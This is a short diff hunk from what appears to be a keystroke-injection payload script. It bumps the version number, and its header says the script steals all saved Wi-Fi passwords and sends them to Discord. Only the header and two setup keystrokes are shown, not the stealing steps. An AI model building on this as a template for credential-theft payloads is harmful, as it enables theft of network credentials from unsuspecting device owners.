@@ -1,6 +1,6 @@
 REM Author: Drack0z
 REM Description: Steals all of the saved Wifi Passwords and send to discord using.
-REM Version:	1.0
+REM Version:	2.0
 REM Category:	Passwords
 DELAY 900
 GUI d
